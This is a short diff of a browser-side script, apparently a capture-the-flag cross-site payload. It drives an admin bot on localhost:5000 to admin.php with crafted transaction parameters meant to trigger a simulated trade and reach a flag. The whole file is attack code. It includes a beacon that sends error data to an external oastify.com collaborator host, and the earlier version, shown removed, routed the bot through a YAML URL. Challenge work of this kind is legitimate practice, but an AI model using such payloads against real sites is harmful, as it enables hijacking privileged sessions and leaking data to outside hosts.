@@ -1,19 +1,24 @@
 <script>
-(async () => {
+      (async () => {
     try {
-      const yaml =
-        "- {amount: 1000001, currency: ZZ, op: BUY}\n" +
-        "- {amount: 1000001, currency: ZZ, op: SELL}\n" +
-        "- {amount: 1, currency: FL, op: BUY}\n";
+      // transactions配列をURLパラメータとして構築
+      const transactions = [
+        {amount: 1000001, country: 'ZZ', op: 'BUY'},
+        {amount: 1000001, country: 'ZZ', op: 'SELL'},
+        {amount: 1, country: 'FLAG', op: 'BUY'}
+      ];
 
-      // YAMLを返すindex.phpのURL（bot内でアクセス）
-      const yamlUrl = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);
+      let params = '';
+      transactions.forEach((tx, i) => {
+        params += `transactions[${i}][amount]=${tx.amount}&`;
+        params += `transactions[${i}][country]=${tx.country}&`;
+      });
 
-      // admin.phpにリダイレクト（bot内で処理）
-      window.location.href = "http://localhost:5000/admin.php?url=" + encodeURIComponent(yamlUrl);
+      // GETリクエストでsimulate_transactions()を実行
+      window.location.href = `http://localhost:5000/admin.php?${params.slice(0, -1)}`;
 
     } catch (e) {
       new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?error=" + encodeURIComponent(String(e));
     }
-})();
+  })();
 </script>
